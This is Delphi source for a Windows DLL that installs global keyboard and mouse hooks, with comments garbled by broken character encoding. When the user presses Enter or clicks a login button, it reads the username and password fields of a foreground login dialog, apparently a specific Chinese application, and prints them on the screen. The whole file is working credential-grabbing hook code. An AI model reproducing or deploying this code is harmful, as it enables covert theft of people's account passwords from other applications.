library HookDLL;

uses Windows, Messages;

var KeyboardHook, MouseHook: HHOOK;

 // ����ȡ����
procedure GetPassWord();
var
  Dialog, ComboBox, Edit: HWND;
  Buffer: array[0..20] of Char;
  ScreenDC: HDC;
  TmpStr: string;
begin
 // �Ƿ��¼��
  Dialog := GetForegroundWindow();

  if FindWindowEx(Dialog, 0, 'Button', 'ע����') = 0 then Exit;

  GetClassName(Dialog, Buffer, 20);
  if (Buffer <> '#32770') then Exit;


 // ȡ�ؼ����
  ComboBox := FindWindowEx(Dialog, 0, 'ComboBox', nil);
  if (ComboBox = 0) then Exit;

  Edit := FindWindowEx(Dialog, 0, 'Edit', nil);
  if (Edit = 0) then Exit;


 // ȡ�ؼ�����
  Buffer[GetWindowText(ComboBox, Buffer, 20)] := #0;
  if (Buffer[0] = #0) then Exit;
  TmpStr := '����: ' + Buffer;

  Buffer[GetWindowText(Edit, Buffer, 20)] := #0;
  if (Buffer[0] = #0) then Exit;
  TmpStr := TmpStr + '����: ' + Buffer;

  
 // �������Ļ
  ScreenDC := GetDC(0);
  TextOut(ScreenDC, 0, 0, PChar(TmpStr), Length(TmpStr));
  ReleaseDC(0, ScreenDC);
end;

 // ���̹��Ӻ���
function KeyboardProc(nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
begin
  if (nCode = HC_ACTION) and (wParam = 13) and (lParam and $80000000 = 0) then GetPassWord();
  Result := CallNextHookEx(KeyboardHook, nCode, wParam, lParam);
end;

 // ��깳�Ӻ���
function MouseProc(nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
var
  Buffer: array[0..10] of Char;
begin 
  if (nCode = HC_ACTION) and (wParam = WM_LBUTTONDOWN) then
  begin
    GetWindowText(PMouseHookStruct(lParam).hwnd, Buffer, 10);
    if (Copy(Buffer, 1, 2) = '��') then GetPassWord();
  end;
  Result := CallNextHookEx(MouseHook, nCode, wParam, lParam);
end;

 // ��װ�����̹���
procedure HookOn();
begin
  KeyboardHook := SetWindowsHookEx(WH_KEYBOARD, @KeyboardProc, HInstance, 0);
  MouseHook := SetWindowsHookEx(WH_MOUSE, @MouseProc, HInstance, 0);
end;

 // ж�������̹���
procedure HookOff();
begin
  UnHookWindowsHookEx(KeyboardHook);
  UnHookWindowsHookEx(MouseHook);
end;

 // ��������
exports HookOn, HookOff;
  
begin
end.    
